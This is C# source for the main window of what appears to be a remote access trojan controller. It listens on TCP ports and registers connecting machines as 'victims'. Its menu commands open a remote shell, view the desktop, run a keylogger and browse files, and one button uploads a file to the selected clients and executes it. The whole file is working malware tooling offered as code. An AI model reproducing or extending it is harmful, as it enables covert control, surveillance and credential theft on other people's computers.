using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.Runtime.InteropServices;
using System.Reflection;
using System.IO;
using System.Linq;


namespace ConsoleApplication4
{
    public partial class Mainwin : Form
    {
        public static ContextMenuStrip cms;
        private static bool listen = true;
        private static LinkedList<TcpListener> myList = new LinkedList<TcpListener>();
        public String Host { get; set; }
        public int ports = 81; 
        public delegate void updateThis () ; 


        public Mainwin()
        {
            
            InitializeComponent();
            cms = this.contextMenuStrip1;  // providing a cms for rows 
            for (int i = 0; i < 21; i++) {
                this.grid1.addRow(); 
            
            }
            Host = SettingsWin.host.Text;
            ports = int.Parse(SettingsWin.Port.Text ) ;

            SettingsWin.resetSocketB.Click += resetSocketB_Click;

            IPAddress ipAd = IPAddress.Parse("127.0.0.1");
            // use local m/c IP address, and 
            // use the same in the client

            /* Initializes the Listener */
            var tempList = new TcpListener(IPAddress.Any, 5202); 
            myList.AddLast(tempList);
            tempList.Start();
           tempList.BeginAcceptSocket(this.AcceptClient,tempList); 
            
            timer1.Start(); 


        }

        void resetSocketB_Click(object sender, EventArgs e)
        {
            foreach (var item in myList)
            {
                item.Stop();
            }
            myList.Clear(); 

            IPAddress ipAd = IPAddress.Parse(SettingsWin.host.Text);
            // use local m/c IP address, and 
            // use the same in the client

            /* Initializes the Listener */


            //TODO : make handle multi listeners  !! 
            String [] a = SettingsWin.Port.Text.Split(','); 
            foreach (String portt in a ) {
                try {

                    var tempList = new TcpListener(IPAddress.Any, int.Parse(portt));
                    tempList.Start(); 
                    tempList.BeginAcceptSocket(this.AcceptClient, tempList);
                    myList.AddLast(tempList); 
                }
                catch { 
                }
            }
              

            
        }

        
        /// <summary>
        /// handle accepted sokets
        /// </summary>
        /// <param name="ar"></param>
        protected void AcceptClient(IAsyncResult ar)
        {
            if (myList != null)
            {
                try
                {   
                    System.Net.Sockets.Socket s = ((TcpListener)ar.AsyncState).EndAcceptSocket(ar);
                    byte[] b = new byte[500];
                    s.Receive(b);
                    String date = DateTime.Now.ToString("HH:mm dd/MM");
                    byte[] btemp = new byte[497];
                    Array.Copy(b, 3, btemp, 0, 497);
                    UTF8Encoding asen = new UTF8Encoding();
                    String data = asen.GetString(btemp).TrimEnd('\0');
                    String[] datas = data.Split('\n');
                    String processid = datas[0];
                    String name = datas[1];


                    victim v = new victim(name, processid, s, b[0], b[1], b[2], date);
                    updateThis funk = () => { grid1.addRow(v); clientl.Text = grid1.numClient + ""; };
                    this.Invoke(funk);




                    if (listen) ((TcpListener)ar.AsyncState).BeginAcceptSocket(this.AcceptClient, ((TcpListener)ar.AsyncState));
                }
                catch (ObjectDisposedException)
                {
                    
                    
                }
            }
        }


        private void grid1_Paint(object sender, PaintEventArgs e)
        {
             
        }

        


    
 

        private void timer1_Tick(object sender, EventArgs e)
        {
         
            foreach (Control r in grid1.Controls) {
               
                if (r is row)
                {
                    
                    row ro = (row)r;
                    if (!ro.alive())
                    {
                        
                        grid1.Controls.Remove(r);
                        grid1.numClient-- ; 
                        clientl.Text = grid1.numClient+""; 
                    }
                }
                else {
                  
                     
                }
            
            }

        }




        public const int WM_NCLBUTTONDOWN = 0xA1;
        public const int HT_CAPTION = 0x2;

        [DllImportAttribute("user32.dll")]
        public static extern int SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);
        [DllImportAttribute("user32.dll")]
        public static extern bool ReleaseCapture();
       

        

        private void pictureBox1_MouseEnter(object sender, EventArgs e)
        {
            Assembly _assembly = Assembly.GetExecutingAssembly();
            Stream _imageStream = _assembly.GetManifestResourceStream("ConsoleApplication4.ressource.images.images.hover_power.png");
            pictureBox1.Image = new Bitmap(_imageStream); 
        }

        private void pictureBox1_MouseLeave(object sender, EventArgs e)
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Mainwin));

            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));

        }

        private void pictureBox2_MouseEnter(object sender, EventArgs e)
        {
            Assembly _assembly = Assembly.GetExecutingAssembly();
            Stream _imageStream = _assembly.GetManifestResourceStream("ConsoleApplication4.ressource.images.images.hover_reduce.png");
            pictureBox2.Image = new Bitmap(_imageStream); 
        }

        private void pictureBox2_MouseLeave(object sender, EventArgs e)
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Mainwin));

            this.pictureBox2.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox2.Image")));
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            foreach (Control c in grid1.Controls) {
                if (c is row) {
                    row ro = (row)c;
                    ro.close(); 
                }
            
            }

            Application.Exit(); 
        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized; 
        }

        private void exec_MouseEnter(object sender, EventArgs e)
        {
            PictureBox p = sender as PictureBox ;
            if (p.MinimumSize.Width == 1)
            {
                String ch = p.Name;
                p.Image = new Bitmap(tools.getButton(ch + "_hov"));
            }
        }

        private void des_MouseLeave(object sender, EventArgs e)
        {   
            PictureBox p = sender as PictureBox ;
            if (p.MinimumSize.Width == 1)
            {
                String ch = p.Name;
                p.Image = new Bitmap(tools.getButton(ch + "_norm"));

            }
        }

        private void delet_Click(object sender, EventArgs e)
        {
            PictureBox p = sender as PictureBox;
            p.MinimumSize = new Size(2, 20);
            String ch = p.Name;
            p.Image = new Bitmap(tools.getButton(ch + "_activ"));


        }

        /// <summary>
        /// handles the clicks on menu
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void contextMenuStrip1_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {
            String command = e.ClickedItem.Text;
            ContextMenuStrip cm = sender as ContextMenuStrip;
            row r = cm.SourceControl as row;
             
            switch (command) { 
                case "cmd" :
                    r.cmd(); 
                    break; 
                case "Desktop" : 
                    r.desktop() ; 
                    break ;
                case "keylogger" :
                    r.keylogger(); 
                    break ; 
                case "Speak" :
                    r.speak();
                    break; 
                case "Navigate Files" :
                    r.nav();
                    break; 
            }


        }

        private void Mainwin_FormClosed(object sender, FormClosedEventArgs e)
        {
            
            listen = false;

            foreach (var item in myList)
            {
                item.Stop(); 

            }
            myList.Clear(); 
        }

        private void label7_Click(object sender, EventArgs e)
        {

        }

        private void exec_Click(object sender, EventArgs e)
        {
            delet_Click(sender, e);
            openFileDialog1.Title = "Choose The file that will be uploaded and executed on selected Clients";

            openFileDialog1.ShowDialog(); 
                
            
            
            
        }

        private void openFileDialog1_FileOk(object sender, CancelEventArgs e)
        {   if(e.Cancel == false ) 
            foreach(Control c   in grid1.Controls ) {
                if (c is row) {
                    row r = (row)c;
                    r.UpFile(((OpenFileDialog)sender).FileName);
                    r.exec(((OpenFileDialog)sender).FileName);
                    exec.MinimumSize = new Size(1, 20);
                    des_MouseLeave(exec, null);
                }
            }
        }

        private void Settings_Click(object sender, EventArgs e)
        {
            /*using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("ConsoleApplication4.ressource.images.nav_03.png"))
            panel2.BackgroundImage = new Bitmap(stream);
            */

            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("ConsoleApplication4.ressource.images.nav.png"))
                panel2.BackgroundImage = new Bitmap(stream);
            panel2.BackgroundImageLayout = ImageLayout.Stretch;
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("ConsoleApplication4.ressource.images.nav_03.png"))
                panel12.BackgroundImage = new Bitmap(stream);
            

            tableLayoutPanel2.Visible = false;
            SettingsWin.Visible = true; 
            
           
            
        }

       
        private void label2_Click(object sender, EventArgs e)
        {
tableLayoutPanel2.Visible = true;
            SettingsWin.Visible = false;
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("ConsoleApplication4.ressource.images.nav_03.png"))
                panel2.BackgroundImage = new Bitmap(stream);
            panel2.BackgroundImageLayout = ImageLayout.Stretch;
            using (Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("ConsoleApplication4.ressource.images.nav.png"))
                panel12.BackgroundImage = new Bitmap(stream);
        }

        private void panel10_MouseDown(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Left)
            {
                ReleaseCapture();
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
            }
        }

        private void SettingsWin_Load(object sender, EventArgs e)
        {

        }

        private void search_Click(object sender, EventArgs e)
        {
            delet_Click( sender, e) ;
            LinkedList<victim> l = getSelected();
            if (l.Count > 0)
            {
                SearchDial sd = new SearchDial(l);
                sd.Show();
            }
           ( (Control)sender).MinimumSize = new Size(1, 20);
            des_MouseLeave(sender, null);

        }

       private void aVirus_Click(object sender, EventArgs e)
        {
            delet_Click(sender, e);
            LinkedList<victim> l = getSelected(); 


        }
        // get selected victims 
        private  LinkedList<victim> getSelected() {
            LinkedList<victim> l = new LinkedList<victim>() ; 
            foreach (var it in grid1.Controls) {
                if (it is row) {
                    row r = (row)it;
                    if (r.isInCheck()) l.AddLast(r.getV() ); 
                }
            }
            return l; 
        }

        private void contextMenuStrip1_Opening(object sender, CancelEventArgs e)
        {

        }

        

        
    }
}
